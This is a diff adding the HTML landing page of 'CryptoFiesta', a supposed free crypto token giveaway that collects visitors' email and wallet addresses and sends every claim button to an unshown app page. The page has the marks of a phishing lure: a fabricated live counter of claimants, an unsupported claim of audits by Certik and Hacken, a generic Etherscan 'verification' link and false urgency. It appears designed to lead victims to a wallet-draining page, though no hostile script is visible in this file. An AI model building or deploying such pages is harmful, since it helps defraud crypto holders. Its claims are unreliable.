@@ -1,0 +1,236 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CryptoFiesta</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
+  </head>
+  <body>
+    <!-- Animated Background -->
+    <div class="animated-background">
+      <div id="particles-js"></div>
+      <div class="gradient-overlay"></div>
+    </div>
+    
+    <!-- Navbar -->
+    <nav class="navbar">
+      <div class="container">
+        <a href="#" class="logo">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0066FF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11.767 19.089c4.924.868 6.14-6.025 1.216-6.894m-1.216 6.894L5.86 18.047m5.908 1.042-.347 1.97m1.563-8.864c4.924.869 6.14-6.025 1.216-6.894m-1.216 6.894-5.907-1.042m5.907 1.042-.346 1.97"></path><path d="M7.116 5.137c-1.057 6.052 7.741 8.159 8.71 2.293l-6.764-1.195-1.946-1.098z"></path><path d="M16.83 20.432c-1.294 5.989-9.075 2.236-7.782-3.504l6.296 1.024 1.486 2.48z"></path></svg>
+          <span class="gradient-text">CryptoFiesta</span>
+        </a>
+        
+        <!-- Desktop Navigation -->
+        <div class="desktop-nav">
+          <a href="#features">Features</a>
+          <a href="#claim">Claim</a>
+          <a href="./app/index.html" class="btn-primary btn-hover-effect">Claim Your Tokens </a>
+        </div>
+        
+        <!-- Mobile Menu Button -->
+        <button id="mobile-menu-button" class="mobile-menu-button">
+          <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg>
+          <svg id="close-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
+        </button>
+      </div>
+      
+      <!-- Mobile Menu -->
+      <div id="mobile-menu" class="mobile-menu hidden">
+        <div class="container">
+          <a href="#features">Features</a>
+          <a href="#claim">Claim</a>
+          <a href="#claim" class="btn-primary">Claim Your Tokens </a>
+        </div>
+      </div>
+    </nav>
+    
+    <!-- Hero Section -->
+    <section class="hero-section">
+      <div id="hero-content" class="hero-content">
+        <div class="badge-container">
+          <span class="badge">Limited Time Offer</span>
+        </div>
+        
+        <h1>Claim Your <span class="gradient-text">Free</span> Crypto<br />
+        <span class="gradient-text">Tokens</span> Today</h1>
+        
+        <p class="subtitle">Join our exclusive giveaway and receive valuable tokens directly to your wallet.
+        Limited availability, act fast to secure your share.</p>
+        
+        <div class="hero-buttons">
+          <a href="./app/index.html" class="btn-primary btn-hover-effect animate-pulse-glow">
+            Claim Your Tokens 
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg>
+          </a>
+          
+          <a href="#features" class="btn-secondary">
+            Learn More
+          </a>
+        </div>
+        
+        <div class="live-counter">
+          <div class="pulse-dot"></div>
+          <span><strong>876</strong> people claimed tokens in the last 24 hours</span>
+        </div>
+      </div>
+      
+      <div class="scroll-indicator">
+        <a href="#features">
+          <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"></path></svg>
+        </a>
+      </div>
+    </section>
+    
+    <!-- Features Section -->
+    <section id="features" class="section">
+      <div class="container">
+        <div class="section-header">
+          <h2>Why Join Our <span class="gradient-text">Giveaway</span></h2>
+          <p>Our token giveaway offers more than just free crypto. Discover all the benefits of participating in our exclusive event.</p>
+        </div>
+        
+        <div id="features-grid" class="features-grid">
+          <!-- Features will be populated by JavaScript -->
+        </div>
+      </div>
+    </section>
+    
+    <!-- Claim Section -->
+    <section id="claim" class="section">
+      <div id="claim-section" class="claim-content">
+        <div class="container">
+          <div class="claim-card">
+            <div class="claim-card-inner">
+              <div class="section-header">
+                <h2>Claim Your <span class="gradient-text">Free Tokens</span> Now</h2>
+                <p>Complete the form below to receive your tokens. Hurry, the giveaway is limited to the first 10,000 participants.</p>
+              </div>
+              
+              <div class="claim-container">
+                <div class="claim-form-container">
+                  <form id="claim-form" class="claim-form"  > 
+                    <div class="form-group">
+                      <label for="email">Email Address</label>
+                      <input type="email" id="email" placeholder="your@email.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                      <label for="wallet">Wallet Address</label>
+                      <input type="text" id="wallet" placeholder="0x..." required>
+                    </div>
+                   
+                    
+                  </form>
+                  <a href="./app/index.html">
+                    <button type="submit" class="btn-claim btn-hover-effect animate-pulse-glow" id="myForm">
+                      Claim Your Tokens
+                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg>
+                    </button>
+                  </a>
+                </div>
+                
+                <!-- <div class="claim-info">
+                  <div class="contract-details">
+                    <h3>Contract Details</h3>
+                    
+                    <div class="contract-info">
+                      <p>Contract Address:</p>
+                      <div class="contract-address-container">
+                        <code id="contract-address">0x7A86C0b064171007716bbD6Ef4C5876c8E9f0E9A</code>
+                        <button id="copy-button" class="copy-button">
+                          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                        </button>
+                      </div>
+                    </div>
+                    
+                    <div class="token-details">
+                      <div class="detail-item">
+                        <p>Tokens per Claim:</p>
+                        <p class="value">5,000 CGV</p>
+                      </div>
+                      
+                      <div class="detail-item">
+                        <p>Supported Networks:</p>
+                        <div class="networks">
+                          <span class="network-badge">Ethereum</span>
+                          <span class="network-badge">BSC</span>
+                          <span class="network-badge">Polygon</span>
+                        </div>
+                      </div>
+                    </div>
+                  </div> -->
+                  
+                  <div class="verified-contract">
+                    <div class="verified-icon">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
+                    </div>
+                    <div class="verified-content">
+                      <h4>Verified Smart Contract</h4>
+                      <p>Our contract has been audited by Certik and Hacken.</p>
+                      <a href="https://etherscan.io" target="_blank" rel="noopener noreferrer" class="verified-link">
+                        View on Etherscan
+                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="m15 3 6 6"></path><path d="M10 14 21 3"></path></svg>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-content">
+          <div class="footer-logo">
+            <a href="#" class="logo">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0066FF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11.767 19.089c4.924.868 6.14-6.025 1.216-6.894m-1.216 6.894L5.86 18.047m5.908 1.042-.347 1.97m1.563-8.864c4.924.869 6.14-6.025 1.216-6.894m-1.216 6.894-5.907-1.042m5.907 1.042-.346 1.97"></path><path d="M7.116 5.137c-1.057 6.052 7.741 8.159 8.71 2.293l-6.764-1.195-1.946-1.098z"></path><path d="M16.83 20.432c-1.294 5.989-9.075 2.236-7.782-3.504l6.296 1.024 1.486 2.48z"></path></svg>
+              <span class="gradient-text">CryptoFiesta</span>
+            </a>
+            <p>Join our exclusive token fiesta and be part of the next generation of crypto enthusiasts.</p>
+            <div class="social-links">
+              <a href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path></svg>
+              </a>
+              <a href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7.86 2h8.28L22 7.86v8.28L16.14 22H7.86L2 16.14V7.86L7.86 2"></path><circle cx="12" cy="12" r="3"></circle><path d="M17 3.18v6.64M21 7.86h-6.64"></path></svg>
+              </a>
+              <a href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"></path><path d="M9 18c-4.51 2-5-2-7-2"></path></svg>
+              </a>
+              <a href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="4"></circle><path d="M4.93 4.93 9.17 9.17"></path><path d="M14.83 14.83 19.07 19.07"></path><path d="M14.83 9.17 19.07 4.93"></path><path d="M14.83 9.17 18.36 5.64"></path><path d="M4.93 19.07 9.17 14.83"></path></svg>
+              </a>
+            </div>
+          </div>
+          
+          <div class="footer-links">
+            <div class="footer-section">
+              <h3>Quick Links</h3>
+              <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#claim">Claim</a></li>
+              </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+          <p>© <span id="currentYear">2025</span> CryptoFiesta. All rights reserved.</p>
+        </div>
+      </div>
+    </footer>
+    
+    <!-- Particles.js -->
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <!-- Main Script -->
+    <script src="script.js"></script>
+  </body>
+</html>
